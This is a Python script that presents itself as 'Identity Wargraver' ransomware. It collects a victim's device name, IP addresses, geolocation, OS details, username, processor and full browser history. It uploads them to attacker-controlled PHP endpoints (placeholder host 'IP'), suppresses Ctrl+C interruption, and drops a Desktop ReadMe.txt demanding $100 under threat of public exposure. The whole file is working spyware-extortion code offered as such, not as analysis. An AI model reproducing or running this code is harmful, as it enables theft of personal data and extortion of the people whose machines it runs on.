# -*- coding: utf-8 -*-
"""
Identity Wargraver ransomware.

@author: Mr. Shark Spam Bot
"""
import socket
import json
import platform
import getpass
import urllib.request
import urllib.parse
import browser_history
import subprocess

while True:
    try:

        # Find device name and use it to find private IP address.
        device_name = socket.getfqdn()
        private_ip = socket.gethostbyname(device_name)

        # Find location and public IP of the device.
        try:
            ipinfo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ipinfo.connect(('ipinfo.io', 80))
            ipinfo.send(b'GET / HTTP/1.1\r\nHost: ipinfo.io\r\n\r\n')
            data = ipinfo.recv(1024).decode()
            ipinfo.close()
            data = data[data.find('{'):]
            data = json.loads(data)
            coordinates = data['loc']
            public_ip = data['ip']
        except socket.gaierror:
            continue

        # Find operating system, its version, and whether it is 32 or 64 bit.
        system = platform.system()
        version = platform.version()
        bit = platform.machine()
        if system == 'Windows':
            system_version = system + ' ' + version + ' ' + bit
        if system == 'Linux':
            system_version = system + ' ' + version + ' ' + bit
        if system == 'Darwin':
            system_version = 'MacOS' + ' ' + version + ' ' + bit

        # Find the current logged in user.
        user = getpass.getuser()

        # Find the system processor.
        processor = platform.processor()

        # Find browser history
        history = browser_history.get_history()
        history = history.formatted('json')
        history = urllib.parse.quote_plus(history).encode()

        # Send data and history to website.
        try:
            data = f'?devicename={device_name}&privateip={private_ip}&coordinates={coordinates}&publicip={public_ip}&systemversion={system_version}&user={user}&processor={processor}'
            data = urllib.parse.quote(data, safe='&?=,')
            website = urllib.request.urlopen(f'http://IP/logger.php{data}')
            website.close()
            device_name = urllib.parse.quote_plus(device_name)
            website = urllib.request.urlopen(f'https://IP/histget.php?filename={device_name}_history.txt', data=history)
            website.close()
        except socket.gaierror:
            continue

        break

    except KeyboardInterrupt:
        continue

while True:
    try:

        RANSOM_TEXT = '''Congrattulations, you have been epiclly wargraved!!!

All your sensitive data including your web history has been uploaded to our servers. U'd better pay us $100 usd
within 1 hour cause if u don't: we will expose you, hone on u as hard as hell, and make sure your public image
will go down the shitter.


Have a nice day BUDDY!!!
        -- The Bababooey Hackerz'''
        home = f'C:\\Users\\{user}'
        try:
            note = f'{home}\\Desktop\\ReadMe.txt'
            with open(note, 'w+') as ransom_note:
                ransom_note.writelines(RANSOM_TEXT)
        except FileNotFoundError:
            try:
                note = f'{home}\\OneDrive\\Desktop\\ReadMe.txt'
                with open(note, 'w+') as ransom_note:
                    ransom_note.writelines(RANSOM_TEXT)
            except FileNotFoundError:
                pass

        break

    except KeyboardInterrupt:
        continue
